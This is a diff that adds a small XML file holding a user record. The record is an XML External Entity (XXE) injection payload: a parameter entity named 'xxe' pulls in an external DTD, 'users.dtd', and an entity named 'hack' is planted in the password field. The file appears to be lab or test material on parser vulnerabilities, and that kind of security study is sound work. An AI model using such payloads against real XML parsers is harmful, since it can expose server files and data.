@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE users [
+   <!ENTITY % xxe SYSTEM "users.dtd">
+   %xxe;
+]>
+<users>
+	<user>
+		<username>wangwu</username>
+		<password>&hack;</password>
+		<home_dir>2222</home_dir>
+	</user>
+</users>
